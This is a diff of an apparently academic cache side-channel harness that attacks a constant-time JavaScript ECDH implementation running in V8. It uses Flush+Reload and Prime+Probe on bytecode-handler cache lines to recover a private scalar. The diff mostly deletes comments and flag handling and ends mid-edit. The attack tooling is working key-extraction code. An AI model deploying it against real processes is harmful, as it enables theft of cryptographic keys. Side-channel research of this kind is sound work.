@@ -27,24 +27,12 @@ enum { cache_line_count = 2, profile_iterations = 1 << 16 };
 
 static const uint64_t max_exec_cycles = (uint64_t)5e10;
 
-/* PP_profile_once/PS_profile_once (src/attack/prime_probe.c) have no
- * sync_ctx-based early exit -- unlike this file's hand-rolled F+R loop,
- * it always polls for the full max_exec_cycles unless profile_iterations
- * fills first. max_exec_cycles above (5e10, a ~17s safety cap) is sized for
- * the F+R loop's early-exit case; used here it would make every PP round
- * take ~17s regardless of how long the real derive took. One ECDH derive is ~9.6M cycles (see
- * project_v8_ecdh_ct_fr); this gives comfortable margin over that, same
- * shape as quickjs_rsa_key_pool.c's own 3e9 (~1s) cap for one RSA sign. */
 static const uint64_t pp_max_exec_cycles = (uint64_t)1e8;
 
 static int victim_runs = 20;
 
 static const char *test_name = "v8_ctjs_ecdh";
 
-/* Set from argv in main, read by v8_victim_thread: the victim now runs on its
- * own pthread, so the paths can no longer be locals of main. Written before
- * pthread_create and never afterwards, which is the ordering that makes them
- * safe to read unsynchronized from the victim. */
 static const char *source_str = nullptr;
 static const char *repeat_str = nullptr;
 static const char *key_path = nullptr;
@@ -58,7 +46,7 @@ static uint64_t **const probe_time = reload_time;
 enum { H_NEGATE = 0, H_BITAND, H_BITXOR, handler_count };
 
 struct handler_info {
-	const char *name; /* exact V8 builtin name, as reported by the JIT event */
+	const char *name;
 	uintptr_t addr;
 	size_t len;
 };
@@ -70,33 +58,26 @@ static handler_info handlers[handler_count] = {
 };
 
 struct target_builtin_line {
-	int handler; /* index into handlers[] */
-	uint64_t off; /* byte offset of the 64 B line within that builtin */
-	char role; /* '0' fires only for a 0-bit, 'c' once per BN.select */
+	int handler;
+	uint64_t off;
+	char role;
 };
 
-/* Overridable with -cl<i>=<handler>:<off>:<role>, which is how a moved leak
- * site is found again: change the mask expression in js/ecdh_ct_eval.js and the
- * slow path moves to a different line of the same handler. */
 static target_builtin_line target_lines[cache_line_count] = {
-	{ H_BITAND, 0x080, '0' }, /* marker: HeapNumber(-0) slow path, 0-bit only */
-	{ H_NEGATE, 0x000, 'c' }, /* clock:  exactly once per BN.select */
+	{ H_BITAND, 0x080, '0' },
+	{ H_NEGATE, 0x000, 'c' },
 };
 
 static int check_bitand(uint64_t *p, uint32_t n) {
-	// TODO;
+
 	return 0;
 }
 
 static int check_negate(uint64_t *p, uint32_t n) {
-	// TODO;
+
 	return 0;
 }
 
-/* "and:0x0c0:0" -> target_lines[cl]. The handler is matched by any unique
- * case-insensitive substring of its V8 name MINUS the "Handler" suffix, so
- * "neg"/"and"/"xor" all work -- matching the full name instead makes every
- * handler match "and", which is a substring of "Handler". */
 static bool parse_target_line(int cl, const char *spec) {
 	if (cl < 0 || cl >= cache_line_count) {
 		log_error("-cl%d: only %d channels exist", cl, cache_line_count);
@@ -162,44 +143,20 @@ static bool parse_target_line(int cl, const char *spec) {
 
 static FR_attacker_thread_config_t fr_lines[cache_line_count];
 
-
 static uint64_t fr_wait_cycles = 2000;
 
 static i64 fr_hit_thresh = 260;
 
-/* Which primitive polls the target lines. F+R flushes and times the target
- * line itself and needs no eviction set; P+P builds one per channel
- * (prepare_evset_thres) and times a traversal of it, which measures and
- * restores in the same pass. */
 enum prim_t { PRIM_FR = 0, PRIM_PP };
 static prim_t prim = PRIM_FR;
 static const char *prim_name(void) {
 	return prim == PRIM_FR ? "fr" : "pp";
 }
 
-/* CSI mode: instead of building an evset for a known target VA, blindly scan
- * every system-wide L3 set, keep only those matching the target line's page
- * offset, and dump each candidate's traces for offline fingerprinting. Set by
- * -csi; the identification (check_fn) itself is not wired up yet. */
 static bool use_csi = false;
 
-/* CSI ground-truth capture, on ONLY when the loaded source has `let debug = 1;`
- * (run_ecdh_ct.sh BITS=1) -- the same switch that drives the normal path's
- * oracle. The victim sets this from its own oracle_on before its CSI loop, so
- * the attacker learns it across the first window rendezvous without a separate
- * flag that could disagree with the source (see the oracle_on comment). When on,
- * identify_one_target resolves and logs the TRUE target set (which candidate
- * evset actually evicts the known target VA) and drains the victim's per-derive
- * (tsc,bit) oracle alongside each dumped candidate's traces. */
 static std::atomic<bool> g_csi_oracle{ false };
 
-/* CSI probe keys: raw-hex scalars whose bit patterns drive BN.select in a
- * distinctive way, so one candidate set's three traces form a fingerprint. Each
- * is loaded into s1 via a SET_KEY window before profiling (v8_set_key's raw-hex
- * branch). Order is fixed and shared across channels.
- *   zeros -> mostly 0-bits   (marker/0-bit line fires ~never)
- *   ones  -> mostly 1-bits   (0-bit line fires ~never, clock every step)
- *   alt   -> alternating     (0-bit line fires every other step) */
 enum { csi_key_count = 3 };
 static const char *csi_probe_keys[csi_key_count] = {
 	"experiments/v8_constant_time_js/ec_key_zeros.hex",
@@ -207,11 +164,6 @@ static const char *csi_probe_keys[csi_key_count] = {
 	"experiments/v8_constant_time_js/ec_key_alt.hex",
 };
 
-/* Unprofiled derive() calls before profiling, so every non-select function
- * (curve field arithmetic, point bookkeeping) tiers up to TurboFan and stops
- * executing the bytecode handlers -- BN.select is pinned to the interpreter
- * from module load (see ecdh_ct_eval.js), so after warmup it is the ONLY code
- * touching them. */
 static int warmup_runs = 5;
 
 static bool name_is(const v8::JitCodeEvent *event, const char *base) {
@@ -304,22 +256,6 @@ static const char *format_counts(char *buf, size_t n, const uint32_t *idx) {
 	return buf;
 }
 
-
-/* ---------------------------------------------------------------------------
- * LIVE HIT-COUNT MONITOR -- catches an evset going bad MID-capture.
- *
- * An absolute ceiling on the clock channel's raw per-run hit count, checked
- * on EVERY captured run -- a single integer compare, cheap enough that there
- * is no reason to gate it behind a flag.
- * It cannot tell WHY a run is noisy (self-eviction, a scheduler hole, a
- * neighbor's cache attack -- this box is shared, see
- * machine was loaded), only THAT it was, which is enough to flag it
- * for the operator without aborting hours of otherwise-good capture over one
- * run.
- *
- * Measured 2026-08-12, 100 P+P runs each: clock channel raw hits/run
- * top out at 568 over 100 known-good runs and bottom out at 2316 over 100
- * known-bad ones -- wide margin either side of 1000. */
 static const uint32_t clock_hit_ceiling = 1000;
 static uint32_t clock_hit_violations = 0;
 
@@ -383,10 +319,6 @@ static void clear_samples(const uint32_t *idx) {
 	}
 }
 
-/* FLUSH+RELOAD: no eviction set at all -- it flushes and times
- * fr_lines[cl].target directly, so it needs neither prepare_evset_thres nor a
- * calibrated threshold, just -wait and -thresh. One thread polls both
- * channels. */
 static void *v8_attacker_thread_fr(void *arg) {
 	(void)arg;
 	log_channels("FR");
@@ -399,7 +331,7 @@ static void *v8_attacker_thread_fr(void *arg) {
 			clflush((volatile void *)fr_lines[cl].target);
 		}
 
-		pthread_barrier_wait(sync_ctx.barrier); /* A: release victim call */
+		pthread_barrier_wait(sync_ctx.barrier);
 		u64 t0 = rdtscp(), t1 = t0;
 		bool full = false;
 		do {
@@ -421,7 +353,7 @@ static void *v8_attacker_thread_fr(void *arg) {
 		} while (!full && sync_ctx_get_action() == SYNC_CTX_START &&
 		         (t1 - t0) < max_exec_cycles);
 
-		pthread_barrier_wait(sync_ctx.barrier); /* B: rendezvous with victim */
+		pthread_barrier_wait(sync_ctx.barrier);
 
 		char counts[256];
 		log_info("run %d/%d: window %lu cyc, hits %s",
@@ -447,17 +379,6 @@ static pthread_barrier_t attacker_threads_barrier;
 static PP_attacker_thread_config_t pp_cfg[cache_line_count];
 static uint32_t ps_run_idx[cache_line_count];
 
-/* PRIME+PROBE, after experiments/quickjs_jpeg/quickjs_jpeg.c: evset and
- * threshold from prepare_evset_thres, each run one PP_profile_once call. One
- * poll times a traversal of the whole set, measuring and re-priming in one
- * pass.
- *
- * A local loop rather than PP_attacker_thread because the victim is in-process
- * and profiled victim_runs times: PP_profile_once has no sync_ctx early exit
- * (so it gets pp_max_exec_cycles, not this file's 17s max_exec_cycles), and
- * the two attacker threads must rendezvous every run through
- * attacker_threads_barrier, since sync_ctx's barrier has only 2 slots.
- */
 static void *v8_attacker_thread_pp(void *arg) {
 	PP_attacker_thread_config_t *cfg = (PP_attacker_thread_config_t *)arg;
 	const int cl = cfg->slot;
@@ -504,13 +425,10 @@ static void *v8_attacker_thread_pp(void *arg) {
 			                      profile_iterations,
 			                      r == 0);
 			check_clock_hits(ps_run_idx[clock_cl], r + 1);
-			/* PP_profile_once does not clear between runs -- it does not have
-			 * to, its victim runs once. Here run r+1 would otherwise dump
-			 * run r's tail wherever it detected less. */
+
 			clear_samples(ps_run_idx);
 		}
-		/* Nobody re-primes (PP_profile_once's next call) until the dump has
-		 * been taken. */
+
 		pthread_barrier_wait(&attacker_threads_barrier);
 	}
 	if (lead) {
@@ -524,25 +442,12 @@ static int64_t vb_ts[victim_bits_max];
 static uint8_t vb_bit[victim_bits_max];
 static char vb_out[victim_bits_max * 24];
 
-/* CSI: the victim fills this with the last derive's formatted (tsc,bit) block
- * after each START window; the attacker copies it out under the (set,key) it
- * drove, once, before opening the next window. Written and read on opposite
- * sides of barrier B, so the barrier orders the handoff. */
 static char g_vb_csi[victim_bits_max * 24];
 static std::atomic<size_t> g_vb_csi_len{ 0 };
 
-/* gt_n, NOT gt_len: gt_len is the fixed capacity of the two arrays, while gt_n
- * is how many slots the last ladder filled. It has to go through a script --
- * these are `let`/`const` bindings in the bundle's script scope, not properties
- * of globalThis, so they cannot be read off the global object. */
 static const char victim_ground_truth[] =
     "(() => { return [gt_ts, gt_bit, gt_n]; })()";
 
-/* Format the victim's per-bit (tsc,bit) block for the LAST derive into `buf` as
- * "tsc,bit\n" lines. Returns bytes written, 0 on any failure. Pure: the caller
- * owns where it goes -- the normal profiling path appends it to victim_bits.txt,
- * the CSI path stashes it per (set,key). Uses the shared vb_ts/vb_bit scratch;
- * only the victim thread ever calls it, so the two modes never race. */
 static size_t format_victim_ground_truth(v8::Isolate *isolate,
                                          v8::Local<v8::Context> context,
                                          v8::Local<v8::Script> grab_script,
@@ -601,16 +506,11 @@ static void grab_victim_ground_truth(v8::Isolate *isolate,
 		return;
 	}
 
-	/* victim_bits.txt, NOT channels -- write_channel_metadata() owns
-	 * <dir>/channels, and clobbering it would cost the decoder the col->role
-	 * mapping, i.e. the whole capture rather than just the oracle. */
 	char dir[256], path[512];
 	snprintf(dir, sizeof(dir), "output/%s_r%05d", test_name, victim_runs);
 	create_directory(dir);
 	snprintf(path, sizeof(path), "%s/victim_bits.txt", dir);
 
-	/* Opened "w" on the first run and kept open, so the later runs append to
-	 * the one file rather than each truncating it. */
 	static FILE *fp = nullptr;
 	if (fp == nullptr) {
 		fp = fopen(path, "w");
@@ -668,8 +568,6 @@ void print_helper(int argc, char *argv[]) {
 	    warmup_runs);
 }
 
-/* Sets s1 (and s2, for a pool .json) from a key file, in the given context.
- * Same-process, same isolate: no cross-thread handoff needed. */
 static bool v8_set_key(v8::Isolate *isolate,
                        v8::Local<v8::Context> context,
                        const char *path) {
@@ -686,8 +584,7 @@ static bool v8_set_key(v8::Isolate *isolate,
 		         "return kp.key1; })()",
 		         key_path_js);
 	} else {
-		/* Party 2 keeps whatever the bundle set: a raw-hex file names one
-		 * scalar, and it is party 1's that the attack recovers. */
+
 		snprintf(key_script,
 		         sizeof(key_script),
 		         "(() => { let k = read(%s).trim(); "
@@ -712,12 +609,6 @@ static bool v8_set_key(v8::Isolate *isolate,
 	return ok;
 }
 
-/* Everything that runs with the isolate ENTERED. It has to be its own
- * scope: v8::Isolate::Scope, the HandleScope, the TryCatch and the
- * Context::Scope must all destruct before Isolate::Dispose(), which is a
- * hard V8 CHECK -- "Disposing the isolate that is entered by a thread".
- * As function-level locals of the thread entry they were still alive at
- * the Dispose() call below and every capture aborted after its last run. */
 static void v8_victim_run(v8::Isolate *isolate) {
 	v8::Isolate::Scope iscope(isolate);
 	v8::HandleScope scope(isolate);
@@ -739,9 +630,7 @@ static void v8_victim_run(v8::Isolate *isolate) {
 	v8::Context::Scope cscope(context);
 
 	log_info("V8 runtime load source (classic script)");
-	/* ecdh_ct_eval.js is a classic (non-module) bundle: its top-level
-		 * `var ec = ...; var s1 = ...;` etc. become globalThis properties when
-		 * run as a plain script, matching v8_ecdh's existing convention. */
+
 	v8::Local<v8::String> source =
 	    v8::String::NewFromUtf8(isolate, source_str).ToLocalChecked();
 	v8::Local<v8::Script> source_script;
@@ -794,16 +683,6 @@ static void v8_victim_run(v8::Isolate *isolate) {
 	                            .ToLocalChecked())
 	        .ToLocalChecked();
 
-	/* Whether the victim records its per-bit ground truth is the LOADED
-	 * SOURCE's decision, not ours: run_ecdh_ct.sh's BITS=1 generates a copy
-	 * with `let debug = 1;` and hands us that. Read it once, here, instead of
-	 * carrying an attacker flag that could disagree with the source actually
-	 * running -- a flag set with debug=0 source drains nothing, and a flag
-	 * forgotten with debug=1 source records pairs and throws them away, and
-	 * both look like a healthy capture that quietly has no oracle.
-	 *
-	 * `typeof` first so an older bundle without the binding reads as off
-	 * rather than throwing a ReferenceError into the enclosing TryCatch. */
 	bool oracle_on = false;
 	{
 		v8::Local<v8::String> dbg_src = v8::String::NewFromUtf8Literal(
@@ -823,10 +702,7 @@ static void v8_victim_run(v8::Isolate *isolate) {
 		         test_name,
 		         victim_runs);
 	}
-	/* Publish the oracle decision so the CSI attacker thread can see it. Set
-	 * here, before the victim's first barrier A below, so it is visible to the
-	 * attacker by the time the first window's barrier B releases -- the attacker
-	 * reads it no earlier than that (see identify_one_target). */
+
 	if (use_csi) {
 		g_csi_oracle.store(oracle_on, std::memory_order_relaxed);
 		if (oracle_on) {
@@ -838,17 +714,9 @@ static void v8_victim_run(v8::Isolate *isolate) {
 
 	log_info("victim ready to start");
 
-	/* CSI: the attacker (identify_ctjs_target_sets) drives every window -- it
-	 * chooses the action and releases barrier A, we act on it, then rendezvous
-	 * at B. SET_KEY reloads s1 from the path the attacker left in sync_ctx.data
-	 * (one of the three probe keys); START runs one derive and flips the action
-	 * to PAUSE so v8_csi_profile_once stops polling; EXIT ends the loop. Unlike
-	 * the profiling loop below, the victim never sets START -- the attacker owns
-	 * opening each window. The first barrier A doubles as the JIT/warmup
-	 * rendezvous: the attacker cannot open a window until we reach it. */
 	if (use_csi) {
 		for (;;) {
-			pthread_barrier_wait(sync_ctx.barrier); /* A: attacker set action */
+			pthread_barrier_wait(sync_ctx.barrier);
 			sync_ctx_action_t act = sync_ctx_get_action();
 			if (act == SYNC_CTX_EXIT) {
 				break;
@@ -861,15 +729,9 @@ static void v8_victim_run(v8::Isolate *isolate) {
 				}
 			} else if (act == SYNC_CTX_START) {
 				(void)repeat_func->Call(context, context->Global(), 0, nullptr);
-				/* Close the window as soon as the derive returns:
-				 * v8_csi_profile_once polls while the action is still START, so
-				 * this is what ends its capture instead of it spinning out the
-				 * full max_cycles. */
+
 				sync_ctx_set_action(SYNC_CTX_PAUSE);
-				/* Then, still before barrier B, format this derive's own
-				 * (tsc,bit) block for the attacker to pick up under the (set,key)
-				 * it drove. After PAUSE so the attacker's window closes promptly;
-				 * the barrier B below orders the buffer for its reader. */
+
 				if (oracle_on) {
 					g_vb_csi_len.store(
 					    format_victim_ground_truth(
@@ -878,7 +740,7 @@ static void v8_victim_run(v8::Isolate *isolate) {
 					    std::memory_order_relaxed);
 				}
 			}
-			pthread_barrier_wait(sync_ctx.barrier); /* B: rendezvous */
+			pthread_barrier_wait(sync_ctx.barrier);
 		}
 		log_info("victim CSI loop done (EXIT)");
 		return;
@@ -886,37 +748,22 @@ static void v8_victim_run(v8::Isolate *isolate) {
 
 	for (int r = 0; r < victim_runs; ++r) {
 		sync_ctx_set_action(SYNC_CTX_START);
-		pthread_barrier_wait(sync_ctx.barrier); /* A */
+		pthread_barrier_wait(sync_ctx.barrier);
 		(void)repeat_func->Call(context, context->Global(), 0, nullptr);
 		sync_ctx_set_action(SYNC_CTX_PAUSE);
 
-		/* Empty the nursery so the NEXT ladder does not have to. The ladder
-		 * allocates ~1.3 MB per derive, so left alone V8 scavenges once per
-		 * ladder inside the attacker's window -- a 190-240k cycle hole, 4-5
-		 * bit slots wide, that walks the ladder at a constant rate and so
-		 * blinds a contiguous band of slots in every trace. Collecting here
-		 * took it from 0.80 to 0.01 stalls per run.
-		 *
-		 * Here rather than at the top of the loop: P+P primes before barrier
-		 * A, so a collection between A and the previous B would sweep 1.3 MB
-		 * against a primed set. After SYNC_CTX_PAUSE the window is closed. */
 		u64 gc_t0 = rdtscp();
 		isolate->RequestGarbageCollectionForTesting(
 		    v8::Isolate::kFullGarbageCollection);
 		if (r == 0) {
-			/* Logged so a capture says in its own output whether it came
-			 * from a binary with this in it. Without the line, a stale
-			 * binary is indistinguishable from a fix that did not work:
-			 * both show the drifting stall. */
+
 			log_info("per-run full GC between window close and barrier B: "
 			         "%lu cyc (--expose-gc)",
 			         (unsigned long)(rdtscp() - gc_t0));
 		}
 
-		pthread_barrier_wait(sync_ctx.barrier); /* B */
-		/* One block of (tsc,bit) pairs per profiled derive, in run order --
-		 * the decoder matches them to traces by position, block i to
-		 * r<i>.out. */
+		pthread_barrier_wait(sync_ctx.barrier);
+
 		if (oracle_on) {
 			grab_victim_ground_truth(isolate, context, grab_script);
 		}
@@ -924,15 +771,7 @@ static void v8_victim_run(v8::Isolate *isolate) {
 }
 
 void *v8_victim_thread(void *) {
-	/* --expose-gc is what RequestGarbageCollectionForTesting checks for; the
-	 * per-run collection in v8_victim_run is a hard ApiCheck failure without
-	 * it. A default young generation can still refill during one ~1.3 MB
-	 * ladder. Keep a 16 MiB semi-space so that its scavenge cannot land in the
-	 * capture window (at the cost of a modestly longer bit period).
-	 *
-	 * This runs AFTER main's SetFlagsFromCommandLine -- the thread is created
-	 * on the line below it -- so these win over anything passed on the
-	 * command line. */
+
 	v8::V8::SetFlagsFromString(
 	    "--allow-natives-syntax --no-sparkplug --always-turbofan "
 	    "--single-threaded --expose-gc --min-semi-space-size=16");
@@ -954,31 +793,16 @@ void *v8_victim_thread(void *) {
 	return nullptr;
 }
 
-/* One CSI channel to scan. page_slot is the target line's page offset in cache
- * lines: every L3 set with the same offset is a candidate for it. check_fn is
- * the (not-yet-implemented) fingerprint that will later pick the real set out of
- * a candidate's three-key traces. */
 struct csi_params_t {
 	uint32_t page_slot;
-	/* The known target line VA, in this same process. Logged to csi_truth.txt
-	 * under CSI ground truth (BITS=1). Unused otherwise. */
+
 	uint8_t *target;
-	/* Hardcoded true target L3 set, or -1 if unknown. The scan does NOT resolve
-	 * this at runtime (see the note above csi_truth writers); fill it in for a
-	 * known-target run. */
+
 	int true_set;
 	const char *label;
 	int (*check_fn)(uint64_t *, uint32_t);
 };
 
-/* Attacker-side single window on one scanned evset, after v8_ecdh_key_pool.cc's
- * v8_csi_profile_once. Prime the set, open the window (SYNC_CTX_START + barrier
- * A releases the victim's one derive), time a repeated access to the scope line
- * (evset->addrs[0]) re-priming on every eviction, then close it (PAUSE + barrier
- * B). The attacker owns START and PAUSE; the victim only reacts -- so this pairs
- * with the victim's use_csi loop, not with the fixed profiling loop. Prime+scope
- * rather than PS_profile_once because a scanned set has no calibrated hit
- * threshold, only the l2/interrupt latencies. */
 static uint32_t v8_csi_profile_once(EVSet *evset,
                                     uint64_t profile_iters,
                                     uint64_t max_cycles,
@@ -993,7 +817,7 @@ static uint32_t v8_csi_profile_once(EVSet *evset,
 	prime_skx_sf_evset_ps_flush(evset, sf_chain, array_repeat, l2_repeat);
 	tsc0 = tsc1 = rdtscp();
 	sync_ctx_set_action(SYNC_CTX_START);
-	pthread_barrier_wait(sync_ctx.barrier); /* A: release victim derive */
+	pthread_barrier_wait(sync_ctx.barrier);
 	do {
 		tsc1 = rdtscp();
 		scope_lat = _time_maccess_aux(scope, end, aux);
@@ -1008,23 +832,10 @@ static uint32_t v8_csi_profile_once(EVSet *evset,
 	} while (tsc1 - tsc0 < max_cycles && index < profile_iters &&
 	         sync_ctx_get_action() == SYNC_CTX_START);
 	sync_ctx_set_action(SYNC_CTX_PAUSE);
-	pthread_barrier_wait(sync_ctx.barrier); /* B: rendezvous with victim */
+	pthread_barrier_wait(sync_ctx.barrier);
 	return index;
 }
 
-/* The true target set is NOT resolved at runtime. Testing the target VA against
- * every pool evset with the library's eviction test spins (generic_test_eviction
- * only advances on an un-migrated rdtscp, so it never terminates against the
- * non-evicting majority on a multi-core taskset), and a hand-rolled prime+probe
- * count was unreliable. It is instead a hardcoded per-target field, csi_params_t
- * .true_set, defaulting to -1 ("unknown"). The target VA is still logged to
- * csi_truth.txt so a known set can be filled in there or offline; the SOLID
- * ground truth is victim_bits.txt, whose per-(set,key) blocks pair with the
- * candidate traces directly. */
-
-/* Append one target line's truth to output/<test_name>/csi_truth.txt,
- * next to the candidate traces the scan dumps. Truncated on the first call so a
- * re-run does not accrete stale lines. */
 static void write_csi_truth(const char *label,
                             uint32_t page_slot,
                             int true_set,
@@ -1047,11 +858,6 @@ static void write_csi_truth(const char *label,
 	first = false;
 }
 
-/* Append one dumped candidate's three oracle blocks to
- * output/<test_name>/victim_bits.txt, each preceded by a `# set <s> col <ki> key
- * <name>` header so the decoder can pair block -> (r<s>.out, column ki). One
- * derive per (set,key), so unlike the normal path's run-ordered blocks these are
- * keyed explicitly. Truncated on the first candidate written. */
 static void write_csi_victim_bits(int l3_set,
                                   char gt_blk[][victim_bits_max * 24],
                                   const size_t *gt_len) {
@@ -1075,17 +881,6 @@ static void write_csi_victim_bits(int l3_set,
 	first = false;
 }
 
-/* Scan every system-wide L3 set sharing this target line's page offset. For each
- * candidate, probe it once per CSI key (loaded via a SET_KEY window) and dump the
- * three traces side by side -- one r<l3_set>.out with csi_key_count columns, in
- * csi_probe_keys order. No selection yet: check_fn is unimplemented, so every
- * candidate with samples is dumped for offline fingerprinting. Each key costs one
- * SET_KEY window plus one profiling window.
- *
- * Under CSI ground truth (BITS=1) this also resolves the true target set once up
- * front and drains the victim's per-derive (tsc,bit) oracle alongside each dumped
- * candidate -- both gated on g_csi_oracle, which the victim published before its
- * first window, so it is set by the time the first barrier B releases below. */
 static void identify_one_target(const csi_params_t *p,
                                 uint64_t **id_sample_tsc,
                                 uint64_t **id_probe_time) {
@@ -1101,8 +896,6 @@ static void identify_one_target(const csi_params_t *p,
 		write_csi_truth(p->label, p->page_slot, p->true_set, (void *)p->target);
 	}
 
-	/* Per-candidate stash of the three keys' oracle blocks, written out only if
-	 * the candidate is dumped. Static: ~18 KB, and only ever touched here. */
 	static char gt_blk[csi_key_count][victim_bits_max * 24];
 	size_t gt_len[csi_key_count] = { 0 };
 
@@ -1121,16 +914,15 @@ static void identify_one_target(const csi_params_t *p,
 
 		uint32_t max_cnt = 0;
 		for (int ki = 0; ki < csi_key_count; ++ki) {
-			/* SET_KEY window: hand the victim the probe key path, barrier A
-			 * releases it to reload s1, barrier B waits until it has. */
+
 			snprintf((char *)sync_ctx.data,
 			         sync_ctx_data_size,
 			         "%s/%s",
 			         cfg->project_root,
 			         csi_probe_keys[ki]);
 			sync_ctx_set_action(SYNC_CTX_SET_KEY);
-			pthread_barrier_wait(sync_ctx.barrier); /* A */
-			pthread_barrier_wait(sync_ctx.barrier); /* B */
+			pthread_barrier_wait(sync_ctx.barrier);
+			pthread_barrier_wait(sync_ctx.barrier);
 
 			memset(id_sample_tsc[ki],
 			       0,
@@ -1143,10 +935,6 @@ static void identify_one_target(const csi_params_t *p,
 			v8_csi_profile_once(
 			    evset, profile_iterations, pp_max_exec_cycles, one_tsc, one_probe);
 
-			/* This key's derive just finished behind barrier B, so g_vb_csi now
-			 * holds its (tsc,bit) block; copy it out before the next window can
-			 * overwrite it. Assigned every key so a failed grab (0) does not leave
-			 * a previous candidate's block behind. */
 			if (ground_truth) {
 				gt_len[ki] = g_vb_csi_len.load(std::memory_order_relaxed);
 				if (gt_len[ki] > sizeof(gt_blk[ki])) {
@@ -1177,8 +965,7 @@ static void identify_one_target(const csi_params_t *p,
 			                     id_probe_time,
 			                     csi_key_count,
 			                     max_cnt);
-			/* Same set id as the trace file, so victim_bits.txt's `set` headers
-			 * line up with r<l3_set>.out. Written only for dumped candidates. */
+
 			if (ground_truth) {
 				write_csi_victim_bits(l3_set, gt_blk, gt_len);
 			}
@@ -1186,33 +973,11 @@ static void identify_one_target(const csi_params_t *p,
 	}
 }
 
-/* CSI scan: build the system-wide evset pool, then for each target line walk the
- * L3 sets sharing its page offset and dump every candidate's three-key traces.
- * This does NOT run the real attack and does NOT yet pick a winning set -- it
- * only filters by VA page offset and dumps, for offline fingerprinting.
- *
- * Prerequisite: init_target_lines() must have run so fr_lines[].target hold the
- * JITted handler VAs (handler addr + line off) the page offsets come from. The
- * victim is driven through its use_csi loop: the first SET_KEY's barrier A also
- * serves as the JIT/warmup rendezvous, and the closing EXIT ends that loop. */
 static int identify_ctjs_target_sets(void) {
 	log_info("l2 thres %d, interrupt thres %d",
 	         detected_cache_lats.l2_thresh,
 	         detected_cache_lats.interrupt_thresh);
 
-	/* get_sf_kth_evset reads the pool sfevset_complex, which LLCF_multi_evset
-	 * populates -- without this every get_sf_kth_evset returns NULL.
-	 *
-	 * hctrl must NOT be pre-started: build_sf_evset_all (called from
-	 * LLCF_multi_evset, src/attack/LLCF.c:219,337) calls start_helper_thread/
-	 * stop_helper_thread on it ITSELF. Starting it here too double-starts the
-	 * helper thread on the same struct -- measured on the evaluation host,
-	 * deterministic SIGSEGV in the second thread's prime_cands_daniel on
-	 * garbage addrs/cnt, every run, right at "About to start evset
-	 * construction" (build_sf_evset_all's own log line). Matches
-	 * quickjs_rsa_key_pool.c's identify_quickjs_target_sets, which never
-	 * starts/stops hctrl around this call either. */
-	/* LLCF_multi_evset is measured-flaky on this host, so retry it. */
 	helper_thread_ctrl hctrl;
 	enum { llcf_max_attempts = 5 };
 	bool pool_built = false;
@@ -1226,15 +991,12 @@ static int identify_ctjs_target_sets(void) {
 		}
 	}
 	if (!pool_built) {
-		/* The victim is already waiting on its first barrier A. Leaving
-		 * without releasing it hangs the process forever on shutdown. */
+
 		sync_ctx_set_action(SYNC_CTX_EXIT);
 		pthread_barrier_wait(sync_ctx.barrier);
 		return 0;
 	}
 
-	/* One buffer per CSI key: the three traces of a candidate set, dumped as
-	 * three columns. */
 	static uint64_t id_tsc_arr[csi_key_count][profile_iterations];
 	static uint64_t id_probe_arr[csi_key_count][profile_iterations];
 	uint64_t *id_sample_tsc[csi_key_count];
@@ -1249,7 +1011,7 @@ static int identify_ctjs_target_sets(void) {
 		    (uint32_t)((((uintptr_t)fr_lines[0].target) & PAGE_MASK) >>
 		               CACHE_LINE_BITS),
 		    fr_lines[0].target,
-		    -1, /* true_set: hardcode when known */
+		    -1,
 		    fr_lines[0].label,
 		    check_bitand,
 		},
@@ -1257,7 +1019,7 @@ static int identify_ctjs_target_sets(void) {
 		    (uint32_t)((((uintptr_t)fr_lines[1].target) & PAGE_MASK) >>
 		               CACHE_LINE_BITS),
 		    fr_lines[1].target,
-		    -1, /* true_set: hardcode when known */
+		    -1,
 		    fr_lines[1].label,
 		    check_negate,
 		},
@@ -1270,13 +1032,6 @@ static int identify_ctjs_target_sets(void) {
 		         (void *)fr_lines[cl].target);
 	}
 
-	/* One rendezvous before the scan, so the victim's g_csi_oracle store (done
-	 * before its first barrier A) is visible when identify_one_target reads the
-	 * flag -- a plain read at the top of the scan would race the victim's setup
-	 * and could miss ground truth silently. A SET_KEY is the victim loop's
-	 * cheapest action; the key it loads is overwritten by the scan's first real
-	 * SET_KEY, and this barrier A doubles as the JIT/warmup rendezvous the scan
-	 * used to get from its own first window. */
 	config_t *cfg = get_config();
 	snprintf((char *)sync_ctx.data,
 	         sync_ctx_data_size,
@@ -1284,29 +1039,21 @@ static int identify_ctjs_target_sets(void) {
 	         cfg->project_root,
 	         csi_probe_keys[0]);
 	sync_ctx_set_action(SYNC_CTX_SET_KEY);
-	pthread_barrier_wait(sync_ctx.barrier); /* A */
-	pthread_barrier_wait(sync_ctx.barrier); /* B: g_csi_oracle now visible */
+	pthread_barrier_wait(sync_ctx.barrier);
+	pthread_barrier_wait(sync_ctx.barrier);
 
 	for (int cl = 0; cl < cache_line_count; ++cl) {
 		identify_one_target(&targets[cl], id_sample_tsc, id_probe_time);
 	}
 
-	/* Release the victim's CSI loop (it is waiting on barrier A). EXIT takes
-	 * only barrier A -- the victim breaks before B, so the attacker must not
-	 * wait on B here either. */
 	sync_ctx_set_action(SYNC_CTX_EXIT);
 	pthread_barrier_wait(sync_ctx.barrier);
 
-	/* No stop_helper_thread(&hctrl) here -- see the comment above
-	 * LLCF_multi_evset: build_sf_evset_all already stopped it internally. */
 	return 1;
 }
 
 int v8_ctjs_ecdh_attack() {
-	/* sync_ctx is already set up: main resets it once, before the victim
-	 * thread exists. Doing it here would race the victim's first
-	 * pthread_barrier_wait, and reset_sync_ctx is free+init on the one global
-	 * -- the loser can be left holding a barrier whose shm was just released. */
+
 	if (cache_env_init(1)) {
 		log_error("failed to initialize cache env");
 		return 1;
@@ -1320,9 +1067,6 @@ int v8_ctjs_ecdh_attack() {
 	init_target_lines();
 	write_channel_metadata();
 
-	/* CSI: scan by page offset, probe each candidate with the three keys, dump,
-	 * then stop -- no real attack. Drives the victim's use_csi loop (SET_KEY /
-	 * START / EXIT) rather than starting the F+R/P+P attacker threads. */
 	if (use_csi) {
 		return identify_ctjs_target_sets() ? 0 : 1;
 	}
@@ -1394,31 +1138,8 @@ int main(int argc, char *argv[]) {
 	{
 		int new_argc = 0;
 		for (int i = 0; i < argc; ++i) {
-			if (strcmp(argv[i], "-fr") == 0) {
-				prim = PRIM_FR;
-			} else if (strcmp(argv[i], "-pp") == 0) {
+			if (strcmp(argv[i], "-pp") == 0) {
 				prim = PRIM_PP;
-			} else if (strcmp(argv[i], "-csi") == 0) {
-				use_csi = true;
-			} else if (strcmp(argv[i], "-debug") == 0) {
-				/* Rejected rather than ignored: silently dropping it would
-				 * leave it to land in a path slot, and accepting it would put
